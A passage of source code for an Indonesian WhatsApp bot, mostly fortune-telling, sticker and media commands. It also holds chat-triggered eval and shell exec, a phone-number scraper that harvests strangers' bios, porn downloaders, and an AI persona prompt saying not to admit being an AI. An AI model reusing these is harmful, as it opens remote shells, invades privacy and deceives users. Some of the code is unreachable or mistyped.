let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Life Path :* ${anu.message.life_path}\n• *Destiny :* ${anu.message.destiny}\n• *Destiny Desire :* ${anu.message.destiny_desire}\n• *Personality :* ${anu.message.personality}\n• *Persentase :* ${anu.message.persentase_kecocokan}`)
}
break
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
if (!text) return reply(`Contoh : ${prefix + command} Dika|Novia`)
let [nama1, nama2] = text.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return reply(anu.message)
TradzSigma.sendImage(m.chat,  anu.message.gambar, `• *Nama Anda :* ${anu.message.nama_anda}\n• *Nama Pasangan :* ${anu.message.nama_pasangan}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}`)
}
break
case 'jadianpernikahan': case 'jadiannikah': {
if (!text) return reply(`Contoh : ${prefix + command} 6, 12, 2020`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Tanggal Pernikahan :* ${anu.message.tanggal}\n• *karakteristik :* ${anu.message.karakteristik}`)
}
break
case 'sifatusaha': {
if (!ext)return reply(`Contoh : ${prefix+ command} 28, 12, 2021`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Lahir :* ${anu.message.hari_lahir}\n• *Usaha :* ${anu.message.usaha}`)
}
break
case  ' rejeki': case 'rezeki': {
if (!text) return reply(`Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Lahir :* ${anu.message.hari_lahir}\n• *Rezeki :* ${anu.message.rejeki}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case '.pekerjaan': {
if (!text) return reply(`Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Lahir :* ${anu.message.hari_lahir}\n• *Pekerjaan :* ${anu.message.pekerjaan}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'ramalannasib': case 'ramalnasib': case 'nasib': {
if (!text) return reply(`Contoh : 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.ramalan_nasib(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Analisa :* ${anu.message.analisa}\n• *Angka Akar :* ${anu.message.angka_akar}\n• *Sifat :* ${anu.message.sifat}\n• *Elemen :* ${anu.message.elemen}\n• *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`)
}
break
case '.potensipenyakit': case '.penyakit': {
if (!text) return reply(`Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Analisa :* ${anu.message.analisa}\n• *Sektor :* ${anu.message.sektor}\n• *Elemen :* ${anu.message.elemen}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'artitarot': case 'tarot': {
if (!text) return reply(`Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
TradzSigma.sendImage(m.chat, anu.message.image, `• *Lahir :* ${anu.message.tgl_lahir}\n• *Simbol Tarot :* ${anu.message.simbol_tarot}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'fengshui': {
if (!text) return `Contoh : ${prefix + command} Dika, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
let [nama, gender, tahun] = text.split`,`
let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tahun_lahir}\n• *Gender :* ${anu.message.jenis_kelamin}\n• *Angka Kua :* ${anu.message.angka_kua}\n• *Kelompok :* ${anu.message.kelompok}\n• *Karakter :* ${anu.message.karakter}\n• *Sektor Baik :* ${anu.message.sektor_baik}\n• *Sektor Buruk :* ${anu.message.sektor_buruk}`)
}
break
case 'haribaik': {
if (!text) return reply(`Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.petung_hari_baik(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Lahir :* ${anu.message.tgl_lahir}\n• *Kala Tinantang :* ${anu.message.kala_tinantang}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'harisangar': case 'taliwangke': {
if (!text) return reply(`Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'harinaas': case 'harisial': {
if (!text) return reply(`Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Hari Naas :* ${anu.message.hari_naas}\n• *Info :* ${anu.message.catatan}\n• *Catatan :* ${anu.message.info}`)
}
break
case 'nagahari': case 'harinaga': {
if (!text) return reply(`Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'arahrejeki': case 'arahrezeki': {
if (!text) return reply(`Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Hari Lahir :* ${anu.message.hari_lahir}\n• *tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Rezeki :* ${anu.message.arah_rejeki}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'peruntungan': {
if (!text) return reply(`Contoh : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`)
let [nama, tgl, bln, thn, untuk] = text.split`,`
let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'weton': case 'wetonjawa': {
if (!text) return reply(`Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.weton_jawa(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Tanggal :* ${anu.message.tanggal}\n• *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n• *Watak Hari :* ${anu.message.watak_hari}\n• *Naga Hari :* ${anu.message.naga_hari}\n• *Jam Baik :* ${anu.message.jam_baik}\n• *Watak Kelahiran :* ${anu.message.watak_kelahiran}`)
}
break
case 'sifat': case 'karakter': {
if (!text) return reply(`Contoh : ${prefix + command} Dika, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Garis Hidup :* ${anu.message.garis_hidup}`)
}
break
case 'keberuntungan': {
if (!text) return reply(`Contoh : ${prefix + command} Dika, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}`)
}
break
case 'memancing': {
if (!text) return reply(`Contoh : ${prefix + command} 12, 1, 2022`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Tanggal :* ${anu.message.tgl_memancing}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'masasubur': {
if (!text) return reply(`Contoh : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`)
let [tgl, bln, thn, siklus] = text.split`,`
let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
if (anu.status == false) return reply(anu.message)
reply(`• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'zodiak': case 'zodiac': {
if (!text) return reply(`Contoh : ${prefix+ command} 7 7 2005`)
let zodiak = [
["capricorn", new Date(1970, 0, 1)],
["aquarius", new Date(1970, 0, 20)],
["pisces", new Date(1970, 1, 19)],
["aries", new Date(1970, 2, 21)],
["taurus", new Date(1970, 3, 21)],
["gemini", new Date(1970, 4, 21)],
["cancer", new Date(1970, 5, 22)],
["leo", new Date(1970, 6, 23)],
["virgo", new Date(1970, 7, 23)],
["libra", new Date(1970, 8, 23)],
["scorpio", new Date(1970, 9, 23)],
["sagittarius", new Date(1970, 10, 22)],
["capricorn", new Date(1970, 11, 22)]
].reverse()

function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
let date = new Date(text)
if (date == 'Invalid Date') return date
let d = new Date()
let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

let zodiac = await getZodiac(birth[1], birth[2])

let anu = await primbon.zodiak(zodiac)
if (anu.status == false) return reply(anu.message)
reply(`• *Zodiak :* ${anu.message.zodiak}\n• *Nomor :* ${anu.message.nomor_keberuntungan}\n• *Aroma :* ${anu.message.aroma_keberuntungan}\n• *Planet :* ${anu.message.planet_yang_mengitari}\n• *Bunga :* ${anu.message.bunga_keberuntungan}\n• *Warna :* ${anu.message.warna_keberuntungan}\n• *Batu :* ${anu.message.batu_keberuntungan}\n• *Elemen :* ${anu.message.elemen_keberuntungan}\n• *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'shio': {
if (!text) return reply(`Contoh : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`)
let anu = await primbon.shio(text)
if (anu.status == false) return reply(anu.message)
reply(`• *Hasil :* ${anu.message}`)
}
break

case 'myip': {
        if (!TradID) return reply(mess.only.owner)
var http = require('http')
http.get({
'host': 'api.ipify.org',
'port': 80,
'path': '/'
}, function(resp) {
resp.on('data', function(ip) {
    replyviex("🔎 Ip Andreas Anda Adalah: " + ip)
})
})
            }
        break
        case 'mathquiz': case 'math': {
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) return replyviex("Masih Ada Sesion Yang Belum Di Selesaikan.")
let { genMath, modes } = require('./lib/math')
if (!text) return replyviex(`Mode: ${Object.keys(modes).join(' | ')}\npilih Contoh: ${prefix}math medium`)
let result = await genMath(text.toLowerCase())
TradzSigma.sendText(m.chat, `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} second`, m).then(() => {
kuismath[m.sender.split('@')[0]] = result.jawaban
})
await sleep(result.waktu)
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer: " + result.jawaban)
replyviex("Time has run out\nAnswer: " + kuismath[m.sender.split('@')[0]])
delete kuismath[m.sender.split('@')[0]]
}
            }
            break
case 'gdrive': {
		if (!args[0]) return replyviex(`Silakan Masukan Link gdrive Anda`)
	replyviex(mess.wait)
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await replyviex(`
≡ *Google Drive Download*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
	TradzSigma.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	reply('yah Error kak laporankan ke owner agar di perbaiki')
  }
}
break
case 'invite': {
	if (!m.isGroup) return reply(mess.only.group)
	if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!text) return replyviex(`Silakan Masukkan Nomer yang Ingin Anda Invite\n\nContoh :\n*${prefix + command}* 6283182739135`)
if (text.includes('+')) return replyviex(`Enter the number together without *+*`)
if (isNaN(text)) return replyviex(`Enter only the numbers plus your country code without spaces`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await TradzSigma.groupInviteCode(group)
      await TradzSigma.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
        replyviex(` An invite link is sent to the user`) 
}
break
case 'xnxxdl': {
	if (!isPrem) return replyprem(mess.premium)
	if (!text) return replyviex(`Enter Url`)
        if (!text.includes('xnxx.com')) return replyviex(`Enter an xnxx link`)
        m.reply(mess.wait)
        const fg = require('api-dylux')
            let xn = await fg.xnxxdl(text)
            console.log(xn)
TradzSigma.sendMessage(m.chat, { caption: `≡  *XNXX DL*
        
▢ *📌 Judul*: ${xn.title}
▢ *🗂️ Size*: ${xn.size}
▢ *⌚Duration* ${xn.ruration}
▢ *🎞️Quality:* ${xn.quality}`, video: {url: xn.url_dl} }, { quoted: m })
}
break
case 'xnxxsearch': {
	if (!isPrem && !TradID) return replyviex(mess.only.owner)
	if (!text) return replyviex(`Enter Query`)
	replyviex("cocote")
	const fg = require('api-dylux')
	let res = await fg.xnxxSearch(text)
            let ff = res.result.map((v, i) => `${i + 1}┃ *Title* : ${v.title}\n*Link:* ${v.link}\n`).join('\n') 
              if (res.status) replyviex(ff)
              }
              break
case 'ringtone': {
		if (!text) return replyviex(`Contoh : ${prefix + command} black rover`)
        let { ringtone } = require('./lib/scraper')
		let anutone2 = await ringtone(text)
		let result = anutone2[Math.floor(Math.random() * anutone2.length)]
		TradzSigma.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
	case 'genshin':
if (!text) return replyviex(`Which genshin are you lookin for?`)
try {
const genshin = require("genshin-api")
a = text.toLowerCase();
const anime = await genshin.Characters(text)
let txt = ""
txt += `🎀 *Nama:* ${anime.name}\n`
txt += `🎖️ *Judul:* ${anime.title}\n`
txt += `💠 *Versi:* ${anime.vision}\n`
txt += `🏹 *Weapon:* ${anime.weapon}\n`
txt += `💮 *Gender:* ${anime.gender}\n`
txt += `🌏 *Nation:* ${anime.nation}\n`
txt += `🪷 *Affiliation:* ${anime.affiliation}\n`
txt += `🌟 *Rarity:* ${anime.rarity}\n`
txt += `❄️ *Constellation:* ${anime.constellation}\n`
txt += `📖 *Description:* ${anime.description}\n`
txt += `🌐 *Url:* https://genshin-impact.fandom.com/wiki/${a}\n`
urll = `https://endpoint.web.id/search/genshin-character?key=Dinz/${a}/portrait`
await TradzSigma.sendMessage(m.chat,{image:{url:urll}, caption:txt},{quoted:m})
} catch (err) {
console.log(err)
return replyviex('Error')
}
break
case 'patrick':
case 'patricksticker': {
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/patrick')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await TradzSigma.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
}
break
case 'dogesticker':
case 'dogestick':
	case 'doge':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/doge')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await TradzSigma.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
}
break
case 'lovesticker':
case 'lovestick' :{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/love')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await TradzSigma.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break
case 'gura':
case 'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await TradzSigma.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break
	case 'anime': {
if (!text) return replyviex(`Anime Apa Yang Anda Cari?`)
const malScraper = require('mal-scraper')
replyviex(mess.wait)
        const anime = await malScraper.getInfoFromName(text).catch(() => null)
        if (!anime) return replyviex(`Could not find`)
let animetxt = `
🎀 *Title: ${anime.title}*
🎋 *Type: ${anime.type}*
🎐 *Premiered on: ${anime.premiered}*
💠 *Total Episodes: ${anime.episodes}*
📈 *Status: ${anime.status}*
💮 *Genres: ${anime.genres}
📍 *Studio: ${anime.studios}*
🌟 *Score: ${anime.score}*
💎 *Rating: ${anime.rating}*
🏅 *Rank: ${anime.ranked}*
💫 *Popularity: ${anime.popularity}*
♦️ *Trailer: ${anime.trailer}*
🌐 *URL: ${anime.url}*
❄ *Description:* ${anime.synopsis}*`
await TradzSigma.sendMessage(m.chat,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
}
break
case 'animevideo': 
case 'amv': {
    if (!text) return reply('Masukan Nomornya Kak\nContoh: .amv 1')
    replyviex(mess.wait)
async function animeVideo() {
    const url = 'https://shortstatusvideos.com/anime-video-status-download/'; // Ganti dengan URL yang sesuai
    const response = await fetch(url);
    const html = await response.text();
    const $ = cheerio.load(html);
    const videos = [];
    $('a.mks_button.mks_button_small.squared').each((index, element) => {
        const href = $(element).attr('href');
        const title = $(element).closest('p').prevAll('p').find('strong').text();
        videos.push({
            title,
            source: href
        });
    });

    const randomIndex = Math.floor(Math.random() * videos.length);
    const randomVideo = videos[randomIndex];

    return randomVideo;
}

async function animeVideo2() {
    const url = 'https://mobstatus.com/anime-whatsapp-status-video/'; // Ganti dengan URL yang sesuai
    const response = await fetch(url);
    const html = await response.text();
    const $ = cheerio.load(html);

    const videos = [];

    const title = $('strong').text();

    $('a.mb-button.mb-style-glass.mb-size-tiny.mb-corners-pill.mb-text-style-heavy').each((index, element) => {
        const href = $(element).attr('href');
        videos.push({
            title,
            source: href
        });
    });

    const randomIndex = Math.floor(Math.random() * videos.length);
    const randomVideo = videos[randomIndex];

    return randomVideo;
}
    if (text == '1') {
        try {
            let resl = await animeVideo()
            let cap = `Nih Kak Videonya`
            await TradzSigma.sendFile(m.chat, resl.source, "", cap, m)
        } catch (e) {
            await reply(eror)
        }
    }
    if (text == '2') {
        try {
            let resl = await animeVideo2()
            let cap = `Nih Kak Videonya`
            await TradzSigma.sendFile(m.chat, resl.source, "", cap, m)
        } catch (e) {
            await reply(eror)
        }
    }
}
break
case 'imdb':
if (!text) return replyviex(`_Name a Series or movie`)
replyviex(mess.wait)
            let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
            let imdbt = ""
            console.log(fids.data)
            imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n"
            imdbt += "🎬Title      : " + fids.data.Title + "\n"
            imdbt += "📅Year       : " + fids.data.Year + "\n"
            imdbt += "⭐Rated      : " + fids.data.Rated + "\n"
            imdbt += "📆Released   : " + fids.data.Released + "\n"
            imdbt += "⏳Runtime    : " + fids.data.Runtime + "\n"
            imdbt += "🌀Genre      : " + fids.data.Genre + "\n"
            imdbt += "👨🏻‍💻Director   : " + fids.data.Director + "\n"
            imdbt += "✍Writer     : " + fids.data.Writer + "\n"
            imdbt += "👨Actors     : " + fids.data.Actors + "\n"
            imdbt += "📃Plot       : " + fids.data.Plot + "\n"
            imdbt += "🌐Language   : " + fids.data.Language + "\n"
            imdbt += "🌍Country    : " + fids.data.Country + "\n"
            imdbt += "🎖️Awards     : " + fids.data.Awards + "\n"
            imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n"
            imdbt += "🏙️Production : " + fids.data.Production + "\n"
            imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n"
            imdbt += "✅imdbVotes  : " + fids.data.imdbVotes + ""
           TradzSigma.sendMessage(m.chat, {
image: {
url: fids.data.Poster,
},
caption: imdbt,
            }, {
quoted: m,
            })
            break
case 'cuaca':
  if (!q) return replyviex('Masukkan nama kota atau wilayah.\nContoh: cuaca Jakarta');

  replyviex('Sedang mencari data cuaca...');

  try {
    const res = await fetch(`https://wttr.in/${encodeURIComponent(q)}?format=j1`);
    const data = await res.json();

    const info = data.current_condition[0];
    const temp = info.temp_C;
    const weather = info.weatherDesc[0].value;
    const humidity = info.humidity;
    const feels = info.FeelsLikeC;
    const wind = info.windspeedKmph;

    const teks = `Cuaca di ${q}:\n- Suhu: ${temp}°C (terasa ${feels}°C)\n- Cuaca: ${weather}\n- Kelembaban: ${humidity}%\n- Angin: ${wind} km/jam`;

    await TradzSigma.sendMessage(from, { text: teks }, { quoted: m });

    // Kirim versi suara pakai TTS
    await TradzSigma.sendMessage(from, {
      audio: {
        url: `https://translate.google.com/translate_tts?ie=UTF-8&client=tw-ob&tl=id&q=${encodeURIComponent(teks)}`
      },
      mimetype: 'audio/mpeg',
      ptt: true
    }, { quoted: m });

  } catch (e) {
    console.log(e);
    replyviex('Gagal mengambil data cuaca. Coba lagi nanti.');
  }
  break;
// CEK CUACA SUP TTS GOOGLE JIR😹
case 'superhd': {
if (!quoted) return replyviex(`Fotonya Mana?`)
if (!/image/.test(mime)) return replyviex(`Send/Reply Foto Dengan Caption ${prefix + command}`)
await TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})

let startTime = Date.now(); 

await replyviex(`⚠️ Mohon tunggu sebentar, proses anda dimulai...\n\n⏳ Proses ini membutuhkan waktu lama untuk menggunakannya, mohon bersabar.`);

if (/remini/.test(command)) cap = `*ᴛʏᴘᴇ :*  sᴜᴘᴇʀʜᴅ \n* ʀᴇsᴜʟᴛ : sᴜᴄᴄᴇss`;
if (/hd/.test(command)) cap = `*ᴛʏᴘᴇ :*  sᴜᴘᴇʀʜᴅ \n* ʀᴇsᴜʟᴛ : sᴜᴄᴄᴇss`;
if (/hdr/.test(command)) cap =  `*ᴛʏᴘᴇ :*  sᴜᴘᴇʀʜᴅ \n* ʀᴇsᴜʟᴛ : sᴜᴄᴄᴇss`;
let media = await TradzSigma.downloadAndSaveMediaMessage(quoted);
try {
let catBoxUrl = await CatBox(media);
console.log('CatBox URL:', catBoxUrl);
let anjai = await fetchJson(`https://api.vreden.my.id/api/artificial/hdr?url=${catBoxUrl}&pixel=4`)
let result = anjai.result.data.downloadUrls[0]
TradzSigma.sendMessage(m.chat, { image: { url: result }, caption: cap }, { quoted: m })
} catch (error) {
console.error(error);
}
}
    break;
           case 'wanumber': case 'searchno': case 'searchnumber':{
           	if (!text) return replyviex(`Provide Number with last number x\n\nContoh: ${prefix + command} 91690913721x`)
var inputnumber = text.split(" ")[0]
        
        replyviex(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
random21 = `${status1}`
            } else if (random_length == 2) {
random21 = `${status1}${status2}`
            } else if (random_length == 3) {
random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await TradzSigma.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
try {
var anu1 = await TradzSigma.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
} else {
text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
}
            } catch {
nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        replyviex(`${text66}${nobio}${nowhatsapp}`)
        }
break
//=================================================//
if (sessions[sender]) {
if (m.isBaileys && m.fromMe) return;
if (!m.text) return;

if (
m.text.startsWith(".") ||
m.text.startsWith("#") ||
m.text.startsWith("!") ||
m.text.startsWith("/") ||
m.text.startsWith("\\/")
) return;

if (!sessions[sender].messages) sessions[sender].messages = [];
sessions[sender].messages.push({ user: m.text });
saveSession();
let chatHistory = sessions[sender].messages.map(msg => `User: ${msg.user}`).join("\n");
let prompt = `
Nama kamu adalah Rover, AI yang santai, ramah, dan suka ngobrol dengan pengguna. 
Kamu hanya menjawab kalau pesan bukan perintah. Gunakan gaya bahasa santai dan sedikit humoris.
Kalau ada yang suruh kamu ngomong aneh-aneh, tolak dengan gaya lucu.

📌 **Aturan Main Rover:**
- Jangan bilang kamu AI, cukup anggap kamu asisten virtual yang bisa ngobrol.
- Gunakan bahasa yang santai, tapi tetap sopan.
- Kalau ditanya pendapat, kasih jawaban yang relate dan enak diajak ngobrol.
- Selingi dengan ekspresi kayak "Wih, keren!", "Hmmm, menarik juga!", atau "Gokil sih!".

Berikut riwayat percakapan:
${chatHistory}

Sekarang, jawab pertanyaan user dengan gaya yang santai dan menyenangkan!
`;
// Edit Logika AI mu Namun jangan hapus ${chatHistory} //
try {
let requestData = { content: m.text, user: sender, prompt };
let response = (await axios.post('https://luminai.my.id', requestData)).data.result;

sessions[sender].messages.push({ bot: response });
saveSession();
return TradzSigma.sendMessage(m.chat, { text: response }, { quoted: m });
} catch (err) {
console.error(err);
return m.reply("⚠️ *Terjadi kesalahan, coba lagi nanti!*");
 }
}
//==================================================//
default:

                if (m.text.toLowerCase() == "bot") {
                    replyviex("ONLINE KO KAKS😆")
                }
                
                                if (m.text.toLowerCase() == "p") {
                    replyviex("MINIMAL SALAM BRO MAU JADI APA LU KEK GITU")
                }
                                if (m.text.toLowerCase() == "assalamualaikum") {
                    replyviex("Wallaikumsallam nah gitu 😎, Jika ada keperluan mohon tunggu saja balasan, Dan jangan spam 😡")
                }   
                
if (budy.startsWith('<')) {
if (!TradID) return
try {
return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}

if (budy.startsWith('$')) {
                    if (!TradID) return reply(mess.only.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replyviex(err)
                        if (stdout) return replyviex(stdout)
                    })
                }


if (budy.startsWith('vv')) {
if (!TradID) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}

if (budy.startsWith('uu')){
if (!TradID) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
let room = Object.values(anon.anonymous).find(p => p.state == "CHATTING" && p.check(sender))
if (room) {
let other = room.other(sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
}
}
/////
	
if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
